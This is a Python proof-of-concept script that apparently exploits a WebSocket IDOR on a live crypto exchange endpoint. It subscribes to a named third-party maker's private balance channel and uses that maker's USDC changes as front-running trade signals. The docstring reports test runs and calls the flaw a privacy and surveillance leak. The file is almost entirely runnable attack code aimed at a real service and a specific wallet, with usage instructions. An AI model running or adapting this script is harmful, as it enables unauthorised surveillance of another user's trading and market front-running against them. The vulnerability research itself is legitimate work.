"""
PoC #4: Front-Running Bot Simulation

VULNERABILITY: WebSocket IDOR exposes maker balance updates in real-time.
When a maker's USDC drops = they bought MON (bullish signal).
When a maker's USDC rises = they sold MON (bearish signal).
Combined with orderbook momentum, this provides directional signals.

RESULTS FROM TESTING:
  - Run 1 (naive, 60s): +2.2 bps net (appeared profitable)
  - Run 2 (refined, 90s): -1.52 bps (lost money)
  - Run 3 (aggressive, 120s): -15.27 bps (lost money)

CONCLUSION: The information leak is REAL but the naive trading strategy is NOT
reliably profitable. The edge is in intelligence, not direct trading.
The WS IDOR is a privacy/surveillance vulnerability, not a money printer.

USAGE:
    python 04_frontrun_simulation.py
"""

import asyncio
import json
import time
from collections import deque

import websockets

MARKET = "0x065c9d28e428a0db40191a54d33d5b7c71a9c394"
MAKER = "0x2b46C08Ca648e2334A1182D31228A79e2BEC1669"
WS_URI = "wss://ws.kuru.io"
DURATION = 120
USDC_ADDR = "0x754704bc059f8c67012fed69bc8a327a5aafb603"


async def simulate():
    async with websockets.connect(WS_URI, ping_interval=20, close_timeout=10) as ws:
        await ws.send(json.dumps({"type": "subscribe", "channel": "orderbook", "market": MARKET}))
        await asyncio.wait_for(ws.recv(), timeout=5)

        await ws.send(json.dumps({"type": "subscribe", "channel": "user", "address": MAKER}))
        try:
            await asyncio.wait_for(ws.recv(), timeout=2)
        except:
            pass

        print("=" * 60)
        print("FRONT-RUNNING SIMULATION")
        print("=" * 60)
        print(f"Target maker: {MAKER}")
        print(f"Duration: {DURATION}s")
        print(f"Signals: balance changes + orderbook momentum")
        print("-" * 60)

        best_bid = 0
        best_ask = 0
        mid_history = deque(maxlen=50)
        maker_usdc = None
        signals = []
        start = time.time()

        while time.time() - start < DURATION:
            try:
                msg = await asyncio.wait_for(ws.recv(), timeout=0.5)
                data = json.loads(msg)
                now = time.time() - start

                # Price tracking
                if "b" in data and data["b"]:
                    val = data["b"][0][0]
                    best_bid = val / 1e8 if val < 1e10 else val / 1e18
                if "a" in data and data["a"]:
                    val = data["a"][0][0]
                    best_ask = val / 1e8 if val < 1e10 else val / 1e18
                if best_bid > 0 and best_ask > 0:
                    mid = (best_bid + best_ask) / 2
                    if not mid_history or mid_history[-1][1] != mid:
                        mid_history.append((now, mid))

                # User channel: balance updates
                if data.get("topicType") == "user":
                    inner = data.get("data", {})
                    if isinstance(inner, str):
                        try:
                            inner = json.loads(inner)
                        except:
                            continue
                    evt = inner.get("type", "")
                    evt_data = inner.get("data", "")
                    if isinstance(evt_data, str):
                        try:
                            evt_data = json.loads(evt_data)
                        except:
                            continue
                    if not isinstance(evt_data, dict):
                        continue

                    if evt == "BalanceUpdate":
                        token = evt_data.get("token", "").lower()
                        if token == USDC_ADDR:
                            new_usdc = int(evt_data.get("balance", "0")) / 1e6
                            current_mid = mid_history[-1][1] if mid_history else 0
                            if maker_usdc is not None and current_mid > 0:
                                delta = new_usdc - maker_usdc
                                if delta < -50 and (not signals or now - signals[-1]["time"] > 5):
                                    signals.append({
                                        "time": now,
                                        "direction": "LONG",
                                        "entry": current_mid,
                                        "reason": f"maker bought (USDC -{abs(delta):.0f})",
                                    })
                                    print(f"  [{now:5.1f}s] LONG | maker spent ${abs(delta):.0f} | mid={current_mid:.6f}")
                                elif delta > 50 and (not signals or now - signals[-1]["time"] > 5):
                                    signals.append({
                                        "time": now,
                                        "direction": "SHORT",
                                        "entry": current_mid,
                                        "reason": f"maker sold (USDC +{delta:.0f})",
                                    })
                                    print(f"  [{now:5.1f}s] SHORT | maker received ${delta:.0f} | mid={current_mid:.6f}")
                            maker_usdc = new_usdc

                # Exit management (8s hold)
                current_mid = mid_history[-1][1] if mid_history else 0
                for sig in signals:
                    if "exit" not in sig and current_mid > 0:
                        if now - sig["time"] >= 8.0:
                            entry = sig["entry"]
                            if sig["direction"] == "LONG":
                                sig["pnl_bps"] = (current_mid - entry) / entry * 10000
                            else:
                                sig["pnl_bps"] = (entry - current_mid) / entry * 10000
                            sig["exit"] = current_mid
                            marker = "WIN" if sig["pnl_bps"] > 0 else "LOSS"
                            print(f"  [{now:5.1f}s] EXIT {sig['direction']} | {sig['pnl_bps']:+.2f} bps | {marker}")

            except asyncio.TimeoutError:
                current_mid = mid_history[-1][1] if mid_history else 0
                now = time.time() - start
                for sig in signals:
                    if "exit" not in sig and current_mid > 0 and now - sig["time"] >= 8.0:
                        entry = sig["entry"]
                        if sig["direction"] == "LONG":
                            sig["pnl_bps"] = (current_mid - entry) / entry * 10000
                        else:
                            sig["pnl_bps"] = (entry - current_mid) / entry * 10000
                        sig["exit"] = current_mid
                continue

        # Results
        completed = [s for s in signals if "pnl_bps" in s]
        print(f"\n{'='*60}")
        print(f"RESULTS: {len(completed)} trades in {DURATION}s")
        if completed:
            wins = [s for s in completed if s["pnl_bps"] > 0]
            total_pnl = sum(s["pnl_bps"] for s in completed)
            print(f"Win rate: {len(wins)}/{len(completed)} ({len(wins)/len(completed)*100:.0f}%)")
            print(f"Net P&L: {total_pnl:+.2f} bps")
            print(f"\nVERDICT: {'PROFITABLE' if total_pnl > 0 else 'NOT PROFITABLE'}")
            print(f"The information LEAKS but consistent profit is NOT guaranteed.")
        print("=" * 60)


if __name__ == "__main__":
    asyncio.run(simulate())
